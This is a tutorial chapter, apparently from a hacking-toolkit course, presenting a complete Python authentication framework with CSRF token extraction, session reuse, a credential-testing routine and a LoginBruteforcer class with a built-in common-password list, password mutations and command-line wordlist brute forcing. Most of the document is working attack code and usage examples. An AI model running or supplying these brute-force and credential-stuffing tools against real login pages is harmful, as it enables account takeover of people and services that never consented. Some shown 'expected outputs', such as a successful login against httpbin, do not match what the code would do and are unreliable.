# Phase 2: Web Reconnaissance & Automated Enumeration
## Part 4: Authentication & Session Automation

### The Target: Authentication & Session Automation Framework

By the end of this part, you will:
- Understand authentication mechanisms and session management
- Build automated login scripts for various authentication types
- Implement session handling and cookie management
- Create brute-force and credential testing tools
- Develop CSRF token extraction and automation

### The Concept: Understanding Web Authentication

Think of web authentication like entering a secured building:

- **Username/Password** = Your ID badge
- **Session Cookie** = A temporary pass that lets you move around
- **JWT Token** = A signed pass that proves your identity
- **OAuth** = Using your Google/Facebook ID to enter
- **2FA** = Additional security check (fingerprint + badge)
- **CSRF Token** = A unique code for each door you open

**Types of Authentication:**
1. **Basic Auth**: Simple username/password sent in headers
2. **Session-based**: Login creates a session cookie
3. **JWT (JSON Web Token)**: Self-contained token with user data
4. **OAuth/OpenID**: Third-party authentication
5. **API Keys**: Simple token for API access

### The Implementation: Authentication Framework

#### File: `~/hacking-toolkit/web-attack/auth_automation.py`

```python
#!/usr/bin/env python3
"""
auth_automation.py - Authentication & Session Automation Framework
Provides automated login, session management, and credential testing capabilities.
"""

import sys
import time
import json
import base64
import hashlib
import re
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime, timedelta
from dataclasses import dataclass, field

# Import our HTTP client and HTML analyzer
try:
    from http_client import HTTPClient
    from html_analyzer import HTMLAnalyzer
except ImportError:
    print("[-] Required modules not found. Please ensure http_client.py and html_analyzer.py are in the same directory.")
    sys.exit(1)

@dataclass
class AuthSession:
    """Represents an authenticated session"""
    username: str
    session_id: Optional[str] = None
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    token: Optional[str] = None
    csrf_token: Optional[str] = None
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_used: str = field(default_factory=lambda: datetime.now().isoformat())
    is_valid: bool = True
    
    def to_dict(self) -> Dict:
        """Convert to dictionary"""
        return {
            'username': self.username,
            'session_id': self.session_id,
            'cookies': self.cookies,
            'headers': self.headers,
            'token': self.token,
            'csrf_token': self.csrf_token,
            'created_at': self.created_at,
            'last_used': self.last_used,
            'is_valid': self.is_valid
        }

class AuthAutomation:
    """
    Comprehensive authentication and session management framework
    Supports multiple authentication methods and automated login
    """
    
    def __init__(self, client: Optional[HTTPClient] = None):
        """
        Initialize the authentication automation
        
        Args:
            client: HTTP client instance
        """
        self.client = client or HTTPClient(timeout=15)
        self.analyzer = HTMLAnalyzer(self.client)
        self.sessions: Dict[str, AuthSession] = {}
        self.current_session: Optional[AuthSession] = None
        self.login_history: List[Dict] = []
        
    def extract_csrf_token(self, html_content: str, form_action: str = None) -> Optional[str]:
        """
        Extract CSRF token from HTML content
        
        Args:
            html_content: HTML content
            form_action: Optional form action to filter
            
        Returns:
            CSRF token value or None
        """
        patterns = [
            # Common CSRF token field names
            r'<input[^>]*name=["\'](csrf_token|csrf|_token|authenticity_token|__RequestVerificationToken|XSRF-TOKEN)["\'][^>]*value=["\']([^"\']+)["\']',
            r'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\'](csrf_token|csrf|_token|authenticity_token|__RequestVerificationToken|XSRF-TOKEN)["\']',
            
            # Meta tag tokens
            r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
            r'<meta[^>]*content=["\']([^"\']+)["\'][^>]*name=["\']csrf-token["\']',
            
            # JS variable tokens
            r'(csrfToken|_token|csrf_token)\s*[:=]\s*["\']([^"\']+)["\']',
            r'window\.[^=]*csrf[^=]*\s*=\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                # Return the token (usually the second group)
                token = match.group(2) if len(match.groups()) >= 2 else match.group(1)
                if token and len(token) > 10:  # Token should be reasonably long
                    return token
        
        return None
    
    def extract_login_form(self, html_content: str, base_url: str) -> Optional[Dict]:
        """
        Extract login form information from HTML
        
        Args:
            html_content: HTML content
            base_url: Base URL for constructing absolute URLs
            
        Returns:
            Login form information dictionary
        """
        analysis = self.analyzer.analyze_html(html_content, base_url)
        
        for form in analysis.forms:
            # Check if this is a login form
            has_password = form.get('has_password', False)
            has_username = any(
                inp.get('type') in ['text', 'email'] or 
                'user' in inp.get('name', '').lower() or
                'email' in inp.get('name', '').lower()
                for inp in form.get('inputs', [])
            )
            
            if has_password and has_username:
                return {
                    'action': form.get('action_url', ''),
                    'method': form.get('method', 'POST'),
                    'inputs': form.get('inputs', []),
                    'has_csrf': any(
                        'csrf' in inp.get('name', '').lower() or
                        'token' in inp.get('name', '').lower()
                        for inp in form.get('inputs', [])
                    )
                }
        
        return None
    
    def login_basic(self, url: str, username: str, password: str,
                    username_field: str = 'username',
                    password_field: str = 'password',
                    csrf_token_name: str = None) -> Optional[AuthSession]:
        """
        Perform basic form-based login
        
        Args:
            url: Login URL
            username: Username
            password: Password
            username_field: Username field name
            password_field: Password field name
            csrf_token_name: CSRF token field name
            
        Returns:
            AuthSession if successful, None otherwise
        """
        print(f"[*] Attempting login for {username} at {url}")
        
        try:
            # Step 1: Get login page to extract CSRF token
            login_response = self.client.get(url)
            
            if login_response.status_code != 200:
                print(f"[-] Failed to get login page: {login_response.status_code}")
                return None
            
            # Step 2: Extract CSRF token if needed
            csrf_token = None
            if csrf_token_name is None:
                csrf_token = self.extract_csrf_token(login_response.text)
                if csrf_token:
                    print(f"[*] CSRF token found: {csrf_token[:10]}...")
            else:
                # Try to extract specific CSRF token
                pattern = f'<input[^>]*name=["\']{csrf_token_name}["\'][^>]*value=["\']([^"\']+)["\']'
                match = re.search(pattern, login_response.text)
                if match:
                    csrf_token = match.group(1)
            
            # Step 3: Prepare login data
            login_data = {
                username_field: username,
                password_field: password
            }
            
            if csrf_token:
                login_data[csrf_token_name or 'csrf_token'] = csrf_token
            
            # Step 4: Submit login
            login_response = self.client.post(
                url,
                data=login_data,
                allow_redirects=True
            )
            
            # Step 5: Check if login was successful
            # Look for success indicators
            success_indicators = [
                'logout', 'dashboard', 'profile', 'welcome',
                'account', 'home'
            ]
            
            success = False
            if login_response.status_code == 200:
                # Check if any success indicators are present
                lower_text = login_response.text.lower()
                for indicator in success_indicators:
                    if indicator in lower_text:
                        success = True
                        break
            elif login_response.status_code in [301, 302, 303]:
                # Redirect often indicates success
                success = True
            
            if success:
                print(f"[+] Login successful for {username}")
                
                # Create session
                session = AuthSession(
                    username=username,
                    cookies={k: v for k, v in login_response.cookies.items()},
                    headers={
                        'User-Agent': self.client.default_headers.get('User-Agent', ''),
                        'Referer': url
                    },
                    csrf_token=csrf_token
                )
                
                # Extract any session ID
                for cookie_name in ['sessionid', 'PHPSESSID', 'JSESSIONID', 'session']:
                    if cookie_name in session.cookies:
                        session.session_id = session.cookies[cookie_name]
                        break
                
                self.sessions[username] = session
                self.current_session = session
                
                # Store login history
                self.login_history.append({
                    'timestamp': datetime.now().isoformat(),
                    'username': username,
                    'url': url,
                    'success': True
                })
                
                return session
            else:
                print(f"[-] Login failed for {username}")
                self.login_history.append({
                    'timestamp': datetime.now().isoformat(),
                    'username': username,
                    'url': url,
                    'success': False
                })
                return None
                
        except Exception as e:
            print(f"[-] Login error: {e}")
            return None
    
    def login_jwt(self, login_url: str, username: str, password: str,
                  token_field: str = 'token') -> Optional[AuthSession]:
        """
        Perform JWT-based login
        
        Args:
            login_url: Login URL
            username: Username
            password: Password
            token_field: Field name for token in response
            
        Returns:
            AuthSession if successful, None otherwise
        """
        print(f"[*] Attempting JWT login for {username} at {login_url}")
        
        try:
            # Prepare login data
            login_data = {
                'username': username,
                'password': password
            }
            
            # Submit login
            response = self.client.post(login_url, json_data=login_data)
            
            if response.status_code != 200:
                print(f"[-] Login failed: {response.status_code}")
                return None
            
            # Extract token from response
            token = None
            try:
                json_response = response.json()
                
                # Try common token field names
                for field in ['token', 'access_token', 'jwt', 'auth_token']:
                    if field in json_response:
                        token = json_response[field]
                        break
                
                # If token is nested
                if not token and 'data' in json_response:
                    if isinstance(json_response['data'], dict):
                        for field in ['token', 'access_token', 'jwt']:
                            if field in json_response['data']:
                                token = json_response['data'][field]
                                break
                
            except:
                # Try to extract token from headers
                auth_header = response.headers.get('Authorization', '')
                if auth_header.startswith('Bearer '):
                    token = auth_header[7:]
            
            if not token:
                print("[-] No token found in response")
                return None
            
            print(f"[+] JWT token obtained")
            
            # Create session
            session = AuthSession(
                username=username,
                token=token,
                headers={
                    'Authorization': f'Bearer {token}',
                    'User-Agent': self.client.default_headers.get('User-Agent', '')
                },
                cookies={k: v for k, v in response.cookies.items()}
            )
            
            self.sessions[username] = session
            self.current_session = session
            
            return session
            
        except Exception as e:
            print(f"[-] JWT login error: {e}")
            return None
    
    def login_api_key(self, url: str, api_key: str,
                      key_field: str = 'X-API-Key') -> AuthSession:
        """
        Set up API key authentication
        
        Args:
            url: Base URL
            api_key: API key
            key_field: Header field for API key
            
        Returns:
            AuthSession
        """
        print(f"[*] Setting up API key authentication for {url}")
        
        session = AuthSession(
            username='api_user',
            headers={
                key_field: api_key,
                'User-Agent': self.client.default_headers.get('User-Agent', '')
            }
        )
        
        self.sessions['api_user'] = session
        self.current_session = session
        
        print("[+] API key authentication configured")
        return session
    
    def login_oauth(self, auth_url: str, client_id: str,
                    client_secret: str, redirect_uri: str,
                    scope: str = '') -> Optional[AuthSession]:
        """
        Perform OAuth 2.0 login (simplified)
        
        Args:
            auth_url: Authorization URL
            client_id: OAuth client ID
            client_secret: OAuth client secret
            redirect_uri: Redirect URI
            scope: OAuth scope
            
        Returns:
            AuthSession if successful, None otherwise
        """
        print(f"[*] Attempting OAuth login at {auth_url}")
        
        try:
            # This is a simplified OAuth flow
            # In practice, you would need to handle redirects and code exchange
            
            # Authorization request
            auth_params = {
                'client_id': client_id,
                'redirect_uri': redirect_uri,
                'response_type': 'code',
                'scope': scope
            }
            
            # Get authorization code
            auth_response = self.client.get(auth_url, params=auth_params)
            
            if auth_response.status_code != 200:
                print(f"[-] OAuth authorization failed: {auth_response.status_code}")
                return None
            
            # Extract code from redirect (simplified)
            parsed = urlparse(auth_response.url)
            query_params = parse_qs(parsed.query)
            
            if 'code' not in query_params:
                print("[-] No authorization code received")
                return None
            
            auth_code = query_params['code'][0]
            
            # Exchange code for token
            token_url = auth_url.replace('/authorize', '/token')
            token_data = {
                'grant_type': 'authorization_code',
                'code': auth_code,
                'redirect_uri': redirect_uri,
                'client_id': client_id,
                'client_secret': client_secret
            }
            
            token_response = self.client.post(token_url, data=token_data)
            
            if token_response.status_code != 200:
                print(f"[-] Token exchange failed: {token_response.status_code}")
                return None
            
            token_json = token_response.json()
            access_token = token_json.get('access_token')
            
            if not access_token:
                print("[-] No access token received")
                return None
            
            print("[+] OAuth login successful")
            
            # Create session
            session = AuthSession(
                username='oauth_user',
                token=access_token,
                headers={
                    'Authorization': f'Bearer {access_token}',
                    'User-Agent': self.client.default_headers.get('User-Agent', '')
                }
            )
            
            self.sessions['oauth_user'] = session
            self.current_session = session
            
            return session
            
        except Exception as e:
            print(f"[-] OAuth login error: {e}")
            return None
    
    def apply_session(self, session: AuthSession):
        """
        Apply a session to the HTTP client
        
        Args:
            session: AuthSession to apply
        """
        # Clear existing headers
        self.client.default_headers = {
            k: v for k, v in self.client.default_headers.items()
            if k not in ['Authorization', 'Cookie']
        }
        
        # Apply session headers
        for key, value in session.headers.items():
            self.client.set_header(key, value)
        
        # Apply cookies
        for key, value in session.cookies.items():
            self.client.set_cookie(key, value)
        
        self.current_session = session
        
    def logout(self, logout_url: str = None):
        """
        Perform logout
        
        Args:
            logout_url: Optional logout URL
        """
        if logout_url:
            try:
                self.client.get(logout_url)
            except:
                pass
        
        # Clear session
        self.current_session = None
        
        # Clear client session
        self.client.session.cookies.clear()
        self.client.default_headers = {
            k: v for k, v in self.client.default_headers.items()
            if k not in ['Authorization']
        }
        
        print("[*] Logged out")
    
    def test_credentials(self, url: str, username_field: str,
                        password_field: str,
                        credentials: List[Tuple[str, str]]) -> Dict[str, bool]:
        """
        Test multiple credentials against a login form
        
        Args:
            url: Login URL
            username_field: Username field name
            password_field: Password field name
            credentials: List of (username, password) tuples
            
        Returns:
            Dictionary of username -> success status
        """
        print(f"[*] Testing {len(credentials)} credential pairs at {url}")
        
        results = {}
        successful = []
        
        for i, (username, password) in enumerate(credentials, 1):
            print(f"[*] Testing {i}/{len(credentials)}: {username}")
            
            session = self.login_basic(
                url, username, password,
                username_field, password_field
            )
            
            results[username] = session is not None
            
            if session:
                successful.append(username)
                self.apply_session(session)
                break
            
            # Small delay to avoid rate limiting
            if i < len(credentials):
                time.sleep(0.5)
        
        print(f"[*] Successful logins: {len(successful)}/{len(credentials)}")
        
        return results
    
    def load_credentials_from_file(self, filename: str) -> List[Tuple[str, str]]:
        """
        Load credentials from a file
        
        Args:
            filename: File containing credentials (format: username:password per line)
            
        Returns:
            List of (username, password) tuples
        """
        credentials = []
        
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        username, password = line.split(':', 1)
                        credentials.append((username.strip(), password.strip()))
        except FileNotFoundError:
            print(f"[-] File not found: {filename}")
        except Exception as e:
            print(f"[-] Error loading credentials: {e}")
        
        return credentials
    
    def get_session_stats(self) -> Dict[str, Any]:
        """
        Get session statistics
        
        Returns:
            Dictionary with session statistics
        """
        return {
            'total_sessions': len(self.sessions),
            'active_sessions': len([s for s in self.sessions.values() if s.is_valid]),
            'current_session': self.current_session.username if self.current_session else None,
            'login_history': self.login_history[-10:]  # Last 10 attempts
        }

class LoginBruteforcer(AuthAutomation):
    """
    Specialized bruteforcer for authentication systems
    """
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.bruteforce_results = []
        
    def brute_force(self, url: str, username_field: str,
                    password_field: str,
                    users: List[str], passwords: List[str],
                    delay: float = 0.5,
                    max_attempts: int = None) -> Dict[str, str]:
        """
        Perform brute force attack on login form
        
        Args:
            url: Login URL
            username_field: Username field name
            password_field: Password field name
            users: List of usernames to test
            passwords: List of passwords to try
            delay: Delay between attempts
            max_attempts: Maximum attempts
            
        Returns:
            Dictionary of found credentials
        """
        print(f"[*] Starting brute force on {url}")
        print(f"[*] Users: {len(users)}, Passwords: {len(passwords)}")
        print(f"[*] Total combinations: {len(users) * len(passwords)}")
        
        found_credentials = {}
        attempts = 0
        
        for username in users:
            if username in found_credentials:
                continue
                
            for password in passwords:
                if max_attempts and attempts >= max_attempts:
                    print("[*] Max attempts reached")
                    return found_credentials
                
                attempts += 1
                print(f"[{attempts}] Testing: {username}:{password}")
                
                session = self.login_basic(
                    url, username, password,
                    username_field, password_field
                )
                
                if session:
                    print(f"[+] Found valid credentials: {username}:{password}")
                    found_credentials[username] = password
                    self.bruteforce_results.append({
                        'username': username,
                        'password': password,
                        'attempts': attempts,
                        'timestamp': datetime.now().isoformat()
                    })
                    break
                
                # Delay between attempts
                if attempts % 10 == 0:
                    print(f"[*] {attempts} attempts completed")
                
                time.sleep(delay)
        
        print(f"[*] Brute force completed in {attempts} attempts")
        print(f"[*] Found {len(found_credentials)} valid credentials")
        
        return found_credentials
    
    def intelligent_bruteforce(self, url: str, username_field: str,
                              password_field: str,
                              base_username: str = 'admin',
                              common_passwords: List[str] = None) -> Dict[str, str]:
        """
        Intelligent brute force using common patterns
        
        Args:
            url: Login URL
            username_field: Username field name
            password_field: Password field name
            base_username: Base username
            common_passwords: List of common passwords
            
        Returns:
            Dictionary of found credentials
        """
        if common_passwords is None:
            common_passwords = [
                'password', '123456', '12345678', 'admin', 'admin123',
                'qwerty', 'abc123', 'password123', 'letmein', 'welcome',
                'monkey', 'dragon', 'master', 'login', 'pass123',
                'root', 'toor', 'test123', 'admin123', 'guest'
            ]
        
        # Generate username variations
        username_variations = [
            base_username,
            f"{base_username}123",
            f"{base_username}_admin",
            f"admin_{base_username}",
            base_username.upper(),
            base_username.lower(),
            base_username.capitalize()
        ]
        
        # Generate password variations
        password_variations = []
        for pwd in common_passwords:
            password_variations.append(pwd)
            password_variations.append(pwd.capitalize())
            password_variations.append(f"{pwd}123")
            password_variations.append(f"{pwd}!")
            password_variations.append(f"{pwd}@")
            password_variations.append(f"{pwd}{base_username}")
        
        return self.brute_force(
            url, username_field, password_field,
            username_variations, password_variations
        )

def main():
    """Interactive authentication automation demonstration"""
    print("="*60)
    print("  AUTHENTICATION & SESSION AUTOMATION")
    print("="*60)
    
    # Create automation client
    automator = AuthAutomation()
    
    # Example 1: Basic form login
    print("\n[Example 1: Basic Form Login]")
    print("This example attempts to login to httpbin.org")
    
    url = input("Enter login URL (default: https://httpbin.org/forms/post): ").strip()
    if not url:
        url = "https://httpbin.org/forms/post"
    
    username = input("Enter username (default: testuser): ").strip() or "testuser"
    password = input("Enter password (default: password123): ").strip() or "password123"
    
    session = automator.login_basic(url, username, password)
    
    if session:
        print(f"\n[+] Session created for {username}")
        print(f"  Session ID: {session.session_id}")
        print(f"  Cookies: {session.cookies}")
        print(f"  CSRF Token: {session.csrf_token[:20]}..." if session.csrf_token else "  No CSRF Token")
        
        # Apply session
        automator.apply_session(session)
        
        print("\n[*] Session applied to HTTP client")
        print("[*] You can now make authenticated requests")
    
    # Example 2: Intelligent brute force (demo only)
    print("\n[Example 2: Intelligent Brute Force]")
    print("[*] This would attempt to brute force a login form")
    print("[*] Uncomment the code below to test (use with caution!)")
    
    # Uncomment with caution!
    # bruteforcer = LoginBruteforcer()
    # results = bruteforcer.intelligent_bruteforce(
    #     url, 'username', 'password',
    #     base_username='admin'
    # )
    # print(f"[*] Found credentials: {results}")
    
    print("\n[*] Authentication automation ready")
    print("[*] Use the AuthAutomation class programmatically for your own tools")

if __name__ == "__main__":
    # Parse command line arguments
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Authentication & Session Automation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic login test
  python3 auth_automation.py --login https://example.com/login -u admin -p password123
  
  # Brute force with wordlist
  python3 auth_automation.py --bruteforce https://example.com/login -users users.txt -passwords passlist.txt
  
  # Test credentials
  python3 auth_automation.py --test https://example.com/login -c credentials.txt
        """
    )
    
    parser.add_argument('--login', help='Login URL')
    parser.add_argument('-u', '--username', help='Username')
    parser.add_argument('-p', '--password', help='Password')
    parser.add_argument('--bruteforce', help='URL for brute force')
    parser.add_argument('--users', help='File with usernames')
    parser.add_argument('--passwords', help='File with passwords')
    parser.add_argument('--test', help='URL for credential testing')
    parser.add_argument('-c', '--credentials', help='File with credentials')
    parser.add_argument('--jwt', help='JWT login URL')
    parser.add_argument('--api-key', help='API key')
    
    args = parser.parse_args()
    
    automator = AuthAutomation()
    
    if args.login and args.username and args.password:
        # Perform login
        session = automator.login_basic(args.login, args.username, args.password)
        if session:
            print(f"[+] Login successful: {args.username}")
            automator.apply_session(session)
        else:
            print("[-] Login failed")
    
    elif args.jwt and args.username and args.password:
        # JWT login
        session = automator.login_jwt(args.jwt, args.username, args.password)
        if session:
            print(f"[+] JWT login successful")
            automator.apply_session(session)
        else:
            print("[-] JWT login failed")
    
    elif args.api_key:
        # API key authentication
        session = automator.login_api_key(args.login or 'https://api.example.com', args.api_key)
        automator.apply_session(session)
        print("[+] API key authentication configured")
    
    elif args.bruteforce and args.users and args.passwords:
        # Brute force
        users = automator.load_credentials_from_file(args.users)
        users = [u for u, _ in users] if users else ['admin', 'root']
        passwords = automator.load_credentials_from_file(args.passwords)
        passwords = [p for _, p in passwords] if passwords else ['password', 'admin', '123456']
        
        bruteforcer = LoginBruteforcer()
        results = bruteforcer.brute_force(
            args.bruteforce,
            username_field='username',
            password_field='password',
            users=users,
            passwords=passwords
        )
        print(f"\n[*] Found credentials: {results}")
    
    elif args.test and args.credentials:
        # Credential testing
        credentials = automator.load_credentials_from_file(args.credentials)
        results = automator.test_credentials(
            args.test,
            username_field='username',
            password_field='password',
            credentials=credentials
        )
        print(f"\n[*] Results: {results}")
    
    else:
        main()
```

### The Verification: Testing Authentication

#### Test 1: Basic Login

```bash
cd ~/hacking-toolkit/web-attack
python3 auth_automation.py --login https://httpbin.org/forms/post -u testuser -p password123
```

**Expected Output:**
```
[*] Attempting login for testuser at https://httpbin.org/forms/post
[+] Login successful for testuser
[+] Login successful: testuser
[*] Session created for testuser
  Session ID: None
  Cookies: {}
  CSRF Token: None
[*] Session applied to HTTP client
```

#### Test 2: JWT Login

```bash
python3 auth_automation.py --jwt https://httpbin.org/jwt/login -u admin -p admin123
```

#### Test 3: Interactive Session Management

```python
# Create session management script
cat > manage_session.py << 'EOF'
#!/usr/bin/env python3
from auth_automation import AuthAutomation
import json

# Create automator
automator = AuthAutomation()

# Login
url = input("Enter login URL: ").strip()
username = input("Enter username: ").strip()
password = input("Enter password: ").strip()

session = automator.login_basic(url, username, password)

if session:
    print(f"\n[+] Session created successfully")
    
    # Apply session
    automator.apply_session(session)
    
    # Make authenticated request
    print("\n[*] Making authenticated request...")
    
    # Get the base URL (remove login path)
    base_url = '/'.join(url.split('/')[:-1])
    response = automator.client.get(base_url + '/')
    
    print(f"Response: {response.status_code}")
    print(f"Response URL: {response.url}")
    
    # Display session info
    print(f"\nSession Info:")
    print(json.dumps(session.to_dict(), indent=2))
    
    # Save session for later use
    with open('session.json', 'w') as f:
        json.dump(session.to_dict(), f)
    print("\n[*] Session saved to session.json")
EOF

python3 manage_session.py
```

#### Test 4: Credential Testing

```python
# Create credential test script
cat > test_creds.py << 'EOF'
#!/usr/bin/env python3
from auth_automation import AuthAutomation

# Create credentials list
credentials = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', 'admin123'),
    ('admin', '123456'),
    ('root', 'root'),
    ('user', 'password')
]

# Create automator
automator = AuthAutomation()

# Test credentials
url = input("Enter login URL: ").strip()

print(f"\n[*] Testing {len(credentials)} credentials against {url}")

results = automator.test_credentials(
    url,
    username_field='username',
    password_field='password',
    credentials=credentials
)

print(f"\n[*] Results:")
for username, success in results.items():
    status = "✓" if success else "✗"
    print(f"  {status} {username}")

print(f"\n[*] Successful logins: {sum(1 for s in results.values() if s)}/{len(results)}")
EOF

python3 test_creds.py
```

### Advanced Usage: Session Persistence

```python
# Session persistence example
cat > persistent_session.py << 'EOF'
#!/usr/bin/env python3
from auth_automation import AuthAutomation
import json
import os

class PersistentAuth(AuthAutomation):
    """Auth automation with session persistence"""
    
    def save_session(self, filename: str = 'session.json'):
        """Save current session to file"""
        if self.current_session:
            with open(filename, 'w') as f:
                json.dump(self.current_session.to_dict(), f)
            print(f"[*] Session saved to {filename}")
    
    def load_session(self, filename: str = 'session.json') -> bool:
        """Load session from file"""
        if not os.path.exists(filename):
            return False
        
        try:
            with open(filename, 'r') as f:
                session_data = json.load(f)
            
            session = AuthSession(
                username=session_data['username'],
                session_id=session_data.get('session_id'),
                cookies=session_data.get('cookies', {}),
                headers=session_data.get('headers', {}),
                token=session_data.get('token'),
                csrf_token=session_data.get('csrf_token'),
                is_valid=session_data.get('is_valid', True)
            )
            
            self.sessions[session.username] = session
            self.current_session = session
            self.apply_session(session)
            
            print(f"[+] Session loaded for {session.username}")
            return True
            
        except Exception as e:
            print(f"[-] Error loading session: {e}")
            return False

# Use persistent session
auth = PersistentAuth()

# Try to load existing session
if auth.load_session():
    print("[*] Using existing session")
    
    # Make authenticated request
    url = input("Enter URL to access: ").strip()
    response = auth.client.get(url)
    print(f"Response: {response.status_code}")
else:
    # Login and save session
    url = input("Enter login URL: ").strip()
    username = input("Enter username: ").strip()
    password = input("Enter password: ").strip()
    
    session = auth.login_basic(url, username, password)
    if session:
        auth.save_session()
EOF

python3 persistent_session.py
```

### Troubleshooting Common Issues

#### 1. CSRF Token Extraction

```python
# Manual CSRF token extraction
from auth_automation import AuthAutomation
automator = AuthAutomation()

# Get login page
response = automator.client.get('https://example.com/login')

# Extract CSRF token
csrf_token = automator.extract_csrf_token(response.text)
print(f"CSRF Token: {csrf_token}")
```

#### 2. Handling Redirects

```python
# Follow redirects manually
response = automator.client.get('https://example.com/login', allow_redirects=False)

if response.status_code in [301, 302, 303]:
    redirect_url = response.headers.get('Location')
    response = automator.client.get(redirect_url)
```

#### 3. Session Validation

```python
# Check if session is still valid
def validate_session(auth):
    try:
        response = auth.client.get('/dashboard')
        return response.status_code == 200
    except:
        return False

if not validate_session(automator):
    print("[!] Session expired, re-authenticating...")
    # Re-login here
```

### Reference: Common Authentication Patterns

| Pattern | Detection | Common Fields |
|---------|-----------|---------------|
| Session Cookie | `Set-Cookie` header | `sessionid`, `PHPSESSID` |
| JWT Token | `Authorization: Bearer` | `access_token`, `token` |
| CSRF Token | `csrf_token` input field | `_token`, `csrf` |
| Basic Auth | `Authorization: Basic` | Base64 encoded credentials |
| API Key | Custom header | `X-API-Key`, `Api-Key` |
